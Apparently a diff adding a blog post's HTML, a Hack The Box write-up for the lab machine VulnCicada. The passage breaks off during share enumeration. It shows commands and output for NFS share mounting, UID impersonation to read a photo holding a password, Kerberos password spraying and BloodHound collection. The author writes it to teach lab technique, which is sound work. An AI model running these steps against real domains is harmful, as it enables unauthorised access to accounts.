@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: VulnCicada | Chaelsoo&#39;s blog</title>
+<meta property="og:title" content="HTB: VulnCicada | Chaelsoo&#39;s blog" />
+<meta name="twitter:title" content="HTB: VulnCicada | Chaelsoo&#39;s blog" />
+<meta itemprop="name" content="HTB: VulnCicada | Chaelsoo&#39;s blog" />
+<meta name="application-name" content="HTB: VulnCicada | Chaelsoo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A Medium Windows AD box where an NFS share leaks a password from a photo, and NTLM being disabled domain-wide turns a standard ESC8 web enrollment relay into a Kerberos relay via DNS SPN spoofing. A DC machine certificate, PKINIT, and secretsdump close it out.">
+<meta itemprop="description" content="A Medium Windows AD box where an NFS share leaks a password from a photo, and NTLM being disabled domain-wide turns a standard ESC8 web enrollment relay into a Kerberos relay via DNS SPN spoofing. A DC machine certificate, PKINIT, and secretsdump close it out." />
+<meta property="og:description" content="A Medium Windows AD box where an NFS share leaks a password from a photo, and NTLM being disabled domain-wide turns a standard ESC8 web enrollment relay into a Kerberos relay via DNS SPN spoofing. A DC machine certificate, PKINIT, and secretsdump close it out." />
+<meta name="twitter:description" content="A Medium Windows AD box where an NFS share leaks a password from a photo, and NTLM being disabled domain-wide turns a standard ESC8 web enrollment relay into a Kerberos relay via DNS SPN spoofing. A DC machine certificate, PKINIT, and secretsdump close it out." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-vulncicada/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-vulncicada/">
+  <meta property="og:site_name" content="Chaelsoo&#39;s blog">
+  <meta property="og:title" content="HTB: VulnCicada">
+  <meta property="og:description" content="A Medium Windows AD box where an NFS share leaks a password from a photo, and NTLM being disabled domain-wide turns a standard ESC8 web enrollment relay into a Kerberos relay via DNS SPN spoofing. A DC machine certificate, PKINIT, and secretsdump close it out.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-09T00:00:00+00:00">
+    <meta property="article:tag" content="Esc8">
+    <meta property="article:tag" content="Krbrelay">
+    <meta property="article:tag" content="Nfs">
+    <meta property="article:tag" content="Ntlm-Disabled">
+    <meta property="article:tag" content="Windows">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: VulnCicada">
+  <meta name="twitter:description" content="A Medium Windows AD box where an NFS share leaks a password from a photo, and NTLM being disabled domain-wide turns a standard ESC8 web enrollment relay into a Kerberos relay via DNS SPN spoofing. A DC machine certificate, PKINIT, and secretsdump close it out.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-vulncicada/">
+    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: VulnCicada</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-09T00:00:00&#43;00:00" itemprop="datePublished"> 9 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-vulncicada/htb-vulncicada-pwned.png" alt="HTB: VulnCicada" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#nfs-the-password-in-the-photo">NFS: The Password in the Photo</a></li>
+    <li><a href="#enumeration-and-dead-ends">Enumeration and Dead Ends</a></li>
+    <li><a href="#esc8-via-kerberos-relay">ESC8 via Kerberos Relay</a>
+      <ul>
+        <li><a href="#step-1-start-krbrelayx">Step 1: Start krbrelayx</a></li>
+        <li><a href="#step-2-add-the-malicious-dns-record">Step 2: Add the Malicious DNS Record</a></li>
+        <li><a href="#step-3-coerce-the-dc-via-dfscoerce">Step 3: Coerce the DC via DFSCoerce</a></li>
+        <li><a href="#step-4-certificate-issued">Step 4: Certificate Issued</a></li>
+      </ul>
+    </li>
+    <li><a href="#pkinit-to-domain-admin">PKINIT to Domain Admin</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>This one genuinely surprised me at almost every step. The entry was a photo on an NFS share with a password on a sticky note - an Easy-box trick on what turns out to be a Medium machine. Then the environment punches back: NTLM is disabled domain-wide, so every standard relay tool, every classic pass-the-hash shortcut, just bounces. The ADCS scan comes back with ESC8, web enrollment over HTTP. Normally that&rsquo;s an NTLM relay to certsrv. Without NTLM it looks dead. But &ldquo;NTLM is disabled&rdquo; doesn&rsquo;t mean relay attacks are impossible - it means you have to do it with Kerberos instead, which is a completely different mechanism that&rsquo;s conceptually harder to grasp. You control the DNS name, so you control the SPN the DC requests a ticket for, so you can be the legitimate endpoint that ticket was meant for and turn around and use it at certsrv. I didn&rsquo;t know this was even a thing before this box. Tons of learning, exactly what a good Medium should feel like.</p>
+<h2 id="recon">Recon</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-09 09:34 +0100
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.18.173
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.090s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">984</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2026-06-09 08:34:41Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind       2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rpcinfo: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   program version    port/proto  service
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp   nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp6  nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/tcp   mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/tcp   nlockmgr
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cicada.vl, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cicada.vl, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">2049/tcp open  nlockmgr      1-4 <span class="o">(</span>RPC <span class="c1">#100021)</span>
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cicada.vl, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: DC-JPQ225<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span></code></pre></div><p>Domain is <code>cicada.vl</code>, DC is <code>DC-JPQ225</code>. Two things stand out immediately. First, NFS on port 2049 - unusual on a Windows DC, worth checking. Second, the first SMB probe tells you everything:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ nxc smb <span class="nv">$DC</span> -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.18.173   <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.18.173   <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\:</span> STATUS_NOT_SUPPORTED 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/vulncicada ❯ nxc smb <span class="nv">$DC</span> -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.18.173   <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.18.173   <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\g</span>uest: STATUS_NOT_SUPPORTED
+</span></span></code></pre></div><p><code>NTLM:False</code>. The domain is running Kerberos-only authentication. Every tool that authenticates via NTLM will get <code>STATUS_NOT_SUPPORTED</code>. This matters a lot for what comes later.</p>
+<h2 id="nfs-the-password-in-the-photo">NFS: The Password in the Photo</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ showmount -e <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">Export list <span class="k">for</span> 10.129.18.173:
+</span></span><span class="line"><span class="cl">/profiles <span class="o">(</span>everyone<span class="o">)</span>
+</span></span></code></pre></div><p>The NFS share is exported to everyone. Mounting it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo mount -t nfs <span class="nv">$DC</span>:/profiles /tmp/nfs_mount -o nolock
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/tmp/nfs_mount ❯ tree
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── Administrator
+</span></span><span class="line"><span class="cl">│   ├── Documents  <span class="o">[</span>error opening dir<span class="o">]</span>
+</span></span><span class="line"><span class="cl">│   └── vacation.png
+</span></span><span class="line"><span class="cl">├── Daniel.Marshall
+</span></span><span class="line"><span class="cl">├── Debra.Wright
+</span></span><span class="line"><span class="cl">├── Jane.Carter
+</span></span><span class="line"><span class="cl">├── Jordan.Francis
+</span></span><span class="line"><span class="cl">├── Joyce.Andrews
+</span></span><span class="line"><span class="cl">├── Katie.Ward
+</span></span><span class="line"><span class="cl">├── Megan.Simpson
+</span></span><span class="line"><span class="cl">├── Richard.Gibbons
+</span></span><span class="line"><span class="cl">├── Rosie.Powell
+</span></span><span class="line"><span class="cl">│   ├── Documents  <span class="o">[</span>error opening dir<span class="o">]</span>
+</span></span><span class="line"><span class="cl">│   └── marketing.png
+</span></span><span class="line"><span class="cl">└── Shirley.West
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">14</span> directories, <span class="m">2</span> files
+</span></span></code></pre></div><p>User profile directories for the whole domain, readable over NFS. Two files exist: <code>vacation.png</code> under Administrator and <code>marketing.png</code> under Rosie.Powell. Documents folders throw errors.</p>
+<p>The files are owned by UID <code>4294967294</code> (<code>0xFFFFFFFE</code>). This is how Windows maps AD account SIDs over NFS when there&rsquo;s no LDAP/Winbind ID mapping configured. Instead of a real Unix UID, the SID gets hashed into this placeholder value. Linux enforces file permissions by UID, so reading these files is blocked - the process running as UID 1000 has no ownership claim over a file owned by <code>4294967294</code>.</p>
+<p>The fix is to create a local user with exactly that UID and run the copy as them:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo useradd -u <span class="m">4294967294</span> -M -s /bin/bash nfstemp
+</span></span><span class="line"><span class="cl">sudo -u nfstemp cp /tmp/nfs_mount/Rosie.Powell/marketing.png /tmp/
+</span></span><span class="line"><span class="cl">sudo chmod <span class="m">644</span> /tmp/marketing.png
+</span></span></code></pre></div><p><img src="/images/writeups/htb-vulncicada/nfs-marketing-password-sticky-note.png" alt="Photo of a developer at their workstation with a sticky note on the monitor reading ‘Cicada123’, leaked from the NFS share via Rosie.Powell’s marketing.png"></p>
+<p><code>Cicada123</code>. Written on a sticky note attached to the monitor in a photo someone put in their work profile share. The NFS export handed us the whole domain user list from the directory tree. Building a wordlist from the names and spraying:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ cat users.txt 
+</span></span><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">Daniel.Marshall
+</span></span><span class="line"><span class="cl">Debra.Wright
+</span></span><span class="line"><span class="cl">Jane.Carter
+</span></span><span class="line"><span class="cl">Jordan.Francis
+</span></span><span class="line"><span class="cl">Joyce.Andrews
+</span></span><span class="line"><span class="cl">Katie.Ward
+</span></span><span class="line"><span class="cl">Megan.Simpson
+</span></span><span class="line"><span class="cl">Richard.Gibbons
+</span></span><span class="line"><span class="cl">Rosie.Powell
+</span></span><span class="line"><span class="cl">Shirley.West
+</span></span></code></pre></div><p>Since NTLM is disabled, the spray has to use Kerberos. That means a working <code>krb5.conf</code> with the domain realm configured:</p>
+<pre tabindex="0"><code>[libdefaults]
+    default_realm = CICADA.VL
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    CICADA.VL = {
+        kdc = DC-JPQ225.cicada.vl
+        admin_server = DC-JPQ225.cicada.vl
+    }
+
+[domain_realm]
+    .cicada.vl = CICADA.VL
+    cicada.vl = CICADA.VL
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ nxc smb DC-JPQ225.cicada.vl -u users.txt -p <span class="s1">&#39;Cicada123&#39;</span> --continue-on-success -k
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\A</span>dministrator:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\D</span>aniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\D</span>ebra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\J</span>ane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\J</span>ordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\J</span>oyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\K</span>atie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\M</span>egan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\R</span>ichard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>+<span class="o">]</span> cicada.vl<span class="se">\R</span>osie.Powell:Cicada123
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\S</span>hirley.West:Cicada123 KDC_ERR_CLIENT_REVOKED
+</span></span></code></pre></div><p>Rosie.Powell. Her own photo handed over her own password.</p>
+<h2 id="enumeration-and-dead-ends">Enumeration and Dead Ends</h2>
+<p>First thing with a new account is BloodHound:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ nxc ldap DC-JPQ225.cicada.vl -u <span class="nv">$USER</span> -p <span class="s1">&#39;Cicada123&#39;</span> -k --bloodhound -c All --dns-server 10.129.18.173
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:None<span class="o">)</span> <span class="o">(</span>channel binding:Never<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        <span class="o">[</span>+<span class="o">]</span> cicada.vl<span class="se">\R</span>osie.Powell:Cicada123
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        Resolved collection methods: rdp, group, acl, dcom, container, trusts, psremote, localadmin, objectprops, session
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        Using kerberos auth without ccache, getting TGT
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        Done in 0M 22S
+</span></span><span class="line"><span class="cl">LDAP        DC-JPQ225.cicada.vl <span class="m">389</span>    DC-JPQ225        Compressing output into /home/kanyo/.nxc/logs/DC-JPQ225_DC-JPQ225.cicada.vl_2026-06-09_120430_bloodhound.zip
+</span></span></code></pre></div><p>Nothing interesting in the graph. No exploitable ACL edges, no delegation, no unusual group memberships. Moved on to share enumeration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ nxc smb DC-JPQ225.cicada.vl -u <span class="nv">$USER</span> -p <span class="s1">&#39;Cicada123&#39;</span> -k --shares
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>+<span class="o">]</span> cicada.vl<span class="se">\R</span>osie.Powell:Cicada123
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        profiles$       READ,WRITE      
+</span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        SYSVOL          READ            Logon server share
